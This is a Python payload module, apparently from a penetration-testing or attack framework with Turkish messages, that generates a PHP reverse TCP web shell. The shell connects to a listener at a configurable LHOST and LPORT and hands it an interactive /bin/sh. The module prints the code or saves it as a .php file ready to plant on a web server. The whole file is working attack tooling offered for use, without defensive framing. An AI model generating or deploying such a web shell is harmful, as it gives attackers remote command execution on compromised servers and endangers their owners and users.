from core.module import BaseModule
from core.option import Option
from typing import Dict, Any

class Payload(BaseModule):
    Name = "php/reverse_tcp"
    Description = "PHP Reverse TCP Web Shell."
    Author = "Mahmut P."
    Category = "payloads"

    def __init__(self):
        super().__init__()
        self.Options = {
            "LHOST": Option("LHOST", "127.0.0.1", True, "Dinleyen IP."),
            "LPORT": Option("LPORT", 4444, True, "Dinleyen Port."),
            "OUTPUT": Option("OUTPUT", "", False, "Payload'ı dosyaya kaydet (örn: shell.php).", completion_dir=".")
        }

    def generate(self) -> str:
        lhost = self.get_option_value("LHOST")
        lport = self.get_option_value("LPORT")

        # Basic PHP Reverse Shell Code (One-Liner style)
        payload = f"""
<?php
$sock=fsockopen("{lhost}",{lport});
$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
"""
        return payload.strip()

    def run(self, options: Dict[str, Any]):
        code = self.generate()
        
        output_path = self.get_option_value("OUTPUT")
        if output_path:
            if not output_path.endswith(".php"):
                output_path += ".php"

            try:
                with open(output_path, "w") as f:
                    f.write(code)
                print(f"[*] Payload başarıyla kaydedildi: {output_path}")
                return f"Payload saved to {output_path}"
            except Exception as e:
                print(f"[!] Dosya yazma hatası: {e}")
                return code

        print(f"[*] PHP Payload oluşturuldu ({len(code)} bytes):")
        print("-" * 50)
        print(code)
        print("-" * 50)
        return code
